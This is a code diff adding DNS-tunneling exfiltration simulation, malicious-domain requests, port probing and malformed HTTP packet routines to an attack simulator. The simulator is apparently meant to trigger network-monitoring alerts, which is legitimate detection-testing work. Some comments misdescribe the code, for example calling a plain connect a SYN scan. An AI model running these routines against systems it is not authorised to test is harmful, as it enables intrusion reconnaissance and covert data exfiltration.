@@ -24,6 +24,9 @@ init(autoreset=True)
 import paramiko
 import requests
 from faker import Faker
+import dns.resolver
+import dns.query
+import dns.message
 
 # Configure logging
 logging.basicConfig(
@@ -419,6 +422,217 @@ class AttackSimulator:
         
         return result
     
+    async def dns_tunneling_attack(self) -> AttackResult:
+        """Simulate DNS tunneling - exfiltrating data via DNS queries"""
+        start_time = time.time()
+        
+        result = AttackResult(
+            timestamp=datetime.now().isoformat(),
+            scenario="dns_tunneling",
+            protocol="dns",
+            target="8.8.8.8",  # Google DNS
+            port=53
+        )
+        
+        try:
+            patterns = self.config['patterns']['dns']
+            domain = random.choice(patterns['domains'])
+            prefix = random.choice(patterns['tunnel_prefixes'])
+            
+            # Generate fake data to "exfiltrate" via DNS
+            fake_data = self.faker.uuid4().replace('-', '')[:16]
+            
+            # Create suspicious DNS query with encoded data
+            query_domain = f"{prefix}{fake_data}.{domain}"
+            
+            resolver = dns.resolver.Resolver()
+            resolver.timeout = 5
+            resolver.lifetime = 5
+            
+            try:
+                # This will fail but will generate DNS traffic
+                answers = resolver.resolve(query_domain, 'A')
+                result.success = True
+            except dns.resolver.NXDOMAIN:
+                # Expected - domain doesn't exist
+                result.success = True
+                result.details = {"query": query_domain, "type": "DNS_TUNNELING"}
+            except Exception as e:
+                result.success = True  # Still generated DNS traffic
+                result.details = {"query": query_domain, "error": str(e)[:50]}
+            
+        except Exception as e:
+            result.error = f"Error: {str(e)}"
+        finally:
+            result.response_time = time.time() - start_time
+        
+        return result
+    
+    async def suspicious_domain_attack(self) -> AttackResult:
+        """Query suspicious/malicious domains to trigger DNS monitoring"""
+        start_time = time.time()
+        
+        result = AttackResult(
+            timestamp=datetime.now().isoformat(),
+            scenario="suspicious_domains",
+            protocol="http",
+            target="dns",
+            port=53
+        )
+        
+        try:
+            patterns = self.config['patterns']['suspicious']
+            url = random.choice(patterns['domains'])
+            user_agent = random.choice(patterns['user_agents'])
+            
+            session = requests.Session()
+            session.headers.update({'User-Agent': user_agent})
+            
+            try:
+                # Attempt to connect (will likely fail, but generates traffic)
+                resp = session.get(url, timeout=3)
+                result.success = True
+                result.details = {"url": url, "user_agent": user_agent, "status": resp.status_code}
+            except requests.exceptions.ConnectionError:
+                # Expected - malicious domain
+                result.success = True
+                result.details = {"url": url, "user_agent": user_agent, "type": "MALICIOUS_DOMAIN"}
+            except requests.exceptions.Timeout:
+                result.success = True
+                result.details = {"url": url, "type": "TIMEOUT"}
+            
+        except Exception as e:
+            result.error = f"Error: {str(e)}"
+        finally:
+            result.response_time = time.time() - start_time
+        
+        return result
+    
+    async def port_scan_attack(self) -> AttackResult:
+        """Simulate port scanning - triggers network monitoring alerts"""
+        target = self.config['target']['host']
+        start_time = time.time()
+        
+        result = AttackResult(
+            timestamp=datetime.now().isoformat(),
+            scenario="port_scan",
+            protocol="scan",
+            target=target,
+            port=0
+        )
+        
+        try:
+            patterns = self.config['patterns']['ports']
+            
+            # Select random port range
+            port_list = patterns['common'] + patterns['suspicious'] + patterns['high']
+            port = random.choice(port_list)
+            
+            result.port = port
+            
+            # Quick TCP SYN scan (connect attempt)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            
+            conn_result = sock.connect_ex((target, port))
+            
+            if conn_result == 0:
+                result.success = True
+                result.details = {"port": port, "state": "open"}
+            else:
+                result.details = {"port": port, "state": "closed/filtered"}
+            
+            sock.close()
+            
+        except Exception as e:
+            result.error = f"Error: {str(e)}"
+        finally:
+            result.response_time = time.time() - start_time
+        
+        return result
+    
+    async def malformed_packet_attack(self) -> AttackResult:
+        """Generate malformed/weird packets to trigger Zeek 'weird' events"""
+        target = self.config['target']['host']
+        start_time = time.time()
+        
+        result = AttackResult(
+            timestamp=datetime.now().isoformat(),
+            scenario="malformed_packets",
+            protocol="weird",
+            target=target,
+            port=80
+        )
+        
+        try:
+            # Generate various weird network behaviors
+            weird_types = [
+                "oversized_http_headers",
+                "malformed_http_request",
+                "invalid_tcp_flags",
+                "fragmented_packets"
+            ]
+            
+            weird_type = random.choice(weird_types)
+            
+            if weird_type == "oversized_http_headers":
+                # Send HTTP request with extremely large headers
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                sock.connect((target, 80))
+                
+                # Create oversized header
+                huge_header = "X-Custom-Header: " + ("A" * 10000) + "\r\n"
+                request = f"GET / HTTP/1.1\r\nHost: {target}\r\n{huge_header}\r\n\r\n"
+                
+                sock.send(request.encode())
+                sock.close()
+                
+            elif weird_type == "malformed_http_request":
+                # Send invalid HTTP request
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                sock.connect((target, 80))
+                
+                # Malformed request (no HTTP version)
+                request = "GET /admin\r\n\r\n"
+                sock.send(request.encode())
+                sock.close()
+                
+            elif weird_type == "invalid_tcp_flags":
+                # Send packet with weird TCP flags combination
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                try:
+                    sock.connect((target, 9999))  # Random port
+                except:
+                    pass
+                sock.close()
+            
+            elif weird_type == "fragmented_packets":
+                # Send data in tiny fragments
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                sock.connect((target, 80))
+                
+                # Send HTTP request one byte at a time
+                request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
+                for char in request:
+                    sock.send(char.encode())
+                    await asyncio.sleep(0.01)
+                
+                sock.close()
+            
+            result.success = True
+            result.details = {"weird_type": weird_type}
+            
+        except Exception as e:
+            result.error = f"Error: {str(e)}"
+        finally:
+            result.response_time = time.time() - start_time
+        
+        return result
+    
     async def run_scenario(self, scenario: Dict):
         """Run a single attack scenario"""
         protocol = scenario['protocol']
@@ -451,6 +665,14 @@ class AttackSimulator:
                 result = await self.postgresql_attack(username, password)
             elif protocol == 'smtp':
                 result = await self.smtp_attack()
+            elif protocol == 'dns':
+                result = await self.dns_tunneling_attack()
+            elif protocol == 'scan':
+                result = await self.port_scan_attack()
+            elif protocol == 'weird':
+                result = await self.malformed_packet_attack()
+            elif scenario['name'] == 'suspicious_domains':
+                result = await self.suspicious_domain_attack()
             else:
                 logger.warning(f"Unknown protocol: {protocol}")
                 continue
